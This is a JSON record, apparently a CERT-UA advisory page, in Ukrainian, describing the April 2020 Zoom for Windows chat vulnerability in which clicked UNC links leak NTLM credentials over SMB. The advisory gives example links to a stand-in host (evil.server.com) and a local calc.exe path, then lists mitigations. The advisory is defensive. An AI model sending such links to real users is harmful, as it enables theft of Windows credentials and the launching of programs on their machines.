@@ -1,0 +1,65 @@
+{
+  "id": 27,
+  "title": "Вразливість в Zoom для Windows",
+  "description": "<p>Під час пандемії все більше людей починають працювати віддалено та проводити конференції чи засідання онлайн.</p><p>Zoom – одна з найпопулярніших програм для відеоконференцій. Версія даного програмного забезпечення для Windows має вразливість у чаті, в якому учасники зустрічей можуть спілкуватися між собою, надсилаючи текстові повідомлення.</p>",
+  "text": "<p>Під час пандемії все більше людей починають працювати віддалено та проводити конференції чи засідання онлайн.</p><p>Zoom – одна з найпопулярніших програм для відеоконференцій. Версія даного програмного забезпечення для Windows має вразливість у чаті, в якому учасники зустрічей можуть спілкуватися між собою, надсилаючи текстові повідомлення.</p><p>Натискання на посилання із UNC шляхом може дозволити зловмисникам красти дані облікового запису Windows.</p><p><strong>UNC</strong> – це літеральний рядок, який вказує розташування файлу в файловій системі, адреса каталогу.</p><p>Наприклад,&nbsp;звичайна URL-адреса, але із UNC шляхом (\\\\ evil.server.com \\ images \\ cat.jpg) перетворюються у гіперпосилання на яке можна натиснути аби відкрити веб-сторінку у своєму браузері, але в такому разі Windows спробує&nbsp;під'єднатися&nbsp;до віддаленого сайту за допомогою протоколу обміну файлами SMB, щоб відкрити віддалений файл cat.jpg.</p><p>Здійснюючи це, Windows за замовчуваннямнадсилає ім’я користувача та хеш паролю NTLM, який можна відновити за допомогою безкоштовних інструментів, таких як Hashcat.</p><p>Наприклад посилання (\\\\ 127.0.0.1 \\ C $ \\ windows \\ system32 \\ calc.exe) запропонує користувачеві запустити калькулятор.</p><h3><strong>Що робити?</strong></h3><ul><li>Не відкривайте посилання, які починаються з “\\\\”. Будьте пильними, поки ZOOM готує оновлення безпеки.</li><li>Заборонити вихідний NTLM трафік до віддалених серверів, налаштувавши відповідну групову політику: Computer Configuration → Windows Settings → Security Settings → Local Policies → Security Options → Network security: Restrict NTLM: Outgoing NTLM traffic to remote servers. У випадаючому меню вибрати “Deny all”.</li></ul><p>Але це може створити проблеми з доступом до спільних ресурсів по протоколу SMB, як додати виключення описано тут (<a href=\"https://www.bleepingcomputer.com/news/security/understanding-the-windows-credential-leak-flaw-and-how-to-prevent-it/\" rel=\"noopener noreferrer\" target=\"_blank\" style=\"color: rgb(0, 123, 255);\">https://www.bleepingcomputer.com/news/security/understanding-the-windows-credential-leak-flaw-and-how-to-prevent-it/</a>).</p><h3><strong>Більше інформації за посиланнями:</strong></h3><ul><li>Cтаття:&nbsp;Zoom Lets Attackers Steal Windows Credentials, Run Programs via UNC Links</li></ul><p><a href=\"https://www.bleepingcomputer.com/news/security/zoom-lets-attackers-steal-windows-credentials-run-programs-via-unc-links/\" rel=\"noopener noreferrer\" target=\"_blank\" style=\"color: rgb(0, 123, 255);\">https://www.bleepingcomputer.com/news/security/zoom-client-leaks-windows-login-credentials-to-attackers/</a></p><ul><li>Стаття: Windows flaw lets Zoom leak network credentials, runs code remotely</li></ul><p><a href=\"https://www.itnews.com.au/news/zoom-for-windows-leaks-network-credentials-runs-code-remotely-545883\" rel=\"noopener noreferrer\" target=\"_blank\" style=\"color: rgb(0, 123, 255);\">https://www.itnews.com.au/news/zoom-for-windows-leaks-network-credentials-runs-code-remotely-545883</a></p><ul><li>Стаття: Be careful! A Windows flaw lets Zoom leak network credentials and run code remotely</li></ul><p><a href=\"https://www.andreafortuna.org/2020/04/01/be-careful-a-windows-flaw-lets-zoom-leak-network-credentials-and-run-code-remotely/\" rel=\"noopener noreferrer\" target=\"_blank\" style=\"color: rgb(0, 123, 255);\">https://www.andreafortuna.org/2020/04/01/be-careful-a-windows-flaw-lets-zoom-leak-network-credentials-and-run-code-remotely/</a></p><ul><li>Стаття: Zero day vulnerability in Zoom allows Remote code execution in Windows &amp; malware attacks</li></ul><p><a href=\"https://www.securitynewspaper.com/2020/04/01/zero-day-vulnerability-in-zoom-allows-remote-code-execution-in-windows-malware-attacks/\" rel=\"noopener noreferrer\" target=\"_blank\" style=\"color: rgb(0, 123, 255);\">https://www.securitynewspaper.com/2020/04/01/zero-day-vulnerability-in-zoom-allows-remote-code-execution-in-windows-malware-attacks/</a></p>",
+  "image": "https://cert.gov.ua/img/articles/27/gPnqwy13ztvxdIelYh5IO3pbJdL45vjjzYUppv7j.jpeg",
+  "previous": {
+    "id": 26,
+    "name": "Звертаємо увагу на використання зловмисниками епідеміологічної ситуації в світі"
+  },
+  "next": {
+    "id": 2496,
+    "name": "Mozilla, VMWare, Apple, Chrome та Cisco випустили оновлення безпеки"
+  },
+  "articles": [
+    {
+      "id": 6284080,
+      "date": "21.06.2025",
+      "title": "Кібератаки UAC-0001 (APT28) у відношенні державних органів із застосуванням BEARDSHELL та COVENANT ",
+      "tags": []
+    },
+    {
+      "id": 4905829,
+      "date": "20.06.2023",
+      "title": "Групою APT28 застосовано три експлойти для Roundcube (CVE-2020-35730, CVE-2021-44026, CVE-2020-12641) під час чергової шпигунської кампанії (CERT-UA#6805)",
+      "tags": []
+    },
+    {
+      "id": 39606,
+      "date": "14.04.2022",
+      "title": "Кібератака на державні організації України з використанням експлойту для XSS вразливості в Zimbra Collaboration Suite (CVE-2018-6882) (CERT-UA#4461)",
+      "tags": []
+    },
+    {
+      "id": 37287,
+      "date": "22.02.2022",
+      "title": "Вразливості в Zabbix (CVE-2022-23131, CVE-2022-23134)",
+      "tags": []
+    },
+    {
+      "id": 17961,
+      "date": "18.01.2022",
+      "title": "Інформація щодо вразливості в продуктах Microsoft CVE-2022-21907",
+      "tags": []
+    }
+  ],
+  "tags": [
+    {
+      "id": 17,
+      "name": "Вразливість"
+    },
+    {
+      "id": 26,
+      "name": "Zoom"
+    }
+  ],
+  "date": "06.04.2020",
+  "langId": null,
+  "_meta": {
+    "requestedId": 27,
+    "actualId": 27,
+    "fetchedAt": "2025-08-26T19:47:02.546Z",
+    "idMismatch": false
+  }
+}
